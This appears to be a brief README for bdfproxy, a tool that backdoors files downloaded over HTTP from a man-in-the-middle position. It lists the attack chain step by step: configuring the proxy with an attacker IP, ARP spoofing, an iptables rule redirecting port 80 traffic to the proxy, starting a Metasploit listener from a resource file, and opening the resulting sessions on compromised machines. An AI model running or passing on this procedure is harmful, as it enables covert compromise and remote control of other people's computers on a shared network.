# bdfproxy.

Inject payloads on downloads on the fly. __You need to be MITM to use this tool__.

## Usage example

1. Set IP address `HOST` and `proxyMode = transparent` in config `/etc/bdfproxy/bdfproxy.cfg`
  * If you are targeting a Windows machine, select proper config section i.e `[[[WindowsIntelx86]]]`
2. Start tool `./bdfproxy.py`
3. Start ARP spoofing (MITM)
4. Redirect intercepted traffic from bettercap to bdfproxy `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
5. Start listening for connections `msfconsole -r /user/share/bdfproxy/bdf_proxy_msf_resource.rc`

### Access sessions

You can then access sessions from _msfconsole_ by pressing enter while listening to connections and:

```
sessions -l
sessions -i <id>
```
